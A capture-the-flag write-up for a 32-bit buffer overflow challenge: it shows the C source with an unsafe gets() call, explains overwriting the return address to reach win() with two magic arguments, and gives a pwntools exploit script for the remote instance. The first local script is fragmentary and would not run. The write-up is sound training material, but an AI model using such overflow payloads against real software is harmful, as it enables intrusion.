We are provided with a compiled binary vuln, the source code vuln.c and a remote instance to connect to.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

Source code analysis

We can see that it defines a BUFSIZE of 100 bytes with a FLAGSIZE of 64 bytes, in this code we have two relevant functions win() and vuln().

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

In the vuln() function it defines a buffer using the BUFSIZE constant with puts to take our input and process it with gets(), as we know gets() is an insecure function and reading its documentation we do not recommend its use.

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

Then we have a function win() which shows us the flag, the difficulty of this challenge is that we must do a ROP to be able to open the flag, since our first argument has to have the value of 0xCAFEF00D and our second argument has to have a value of 0xF00DF00D.

Vulnerabilidad

We are facing a binary vulnerable to Buffer Overflow, we must overwrite the return address and then call the win() function and through ROP pass the memory addresses expected by the program.

Flag

To solve the challenge locally create a file called flag.txt and with the following script I managed to get the flag.

from pwn import *

# Open binary

log.info(p.clean())

Now I modified some things in the script to get the flag on the remote instance.

from pwn import *

def get_process():
    if len(sys.argv) != 2:
        print('Usage: python3 solve.py <ip:port>')
        exit(1)
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def main():
    # Remote instance
    conn = get_process()

    # Payload
    payload = b'A' * 112
    payload += p32(0x08049296)
    payload += p32(0x0)
    payload += p32(0xCAFEF00D)
    payload += p32(0xF00DF00D)
    
    conn.sendlineafter(b'Please enter your string: \n', payload)
    conn.recv()
    
    # Flag
    print(conn.recv())

if __name__ == '__main__':
    main()
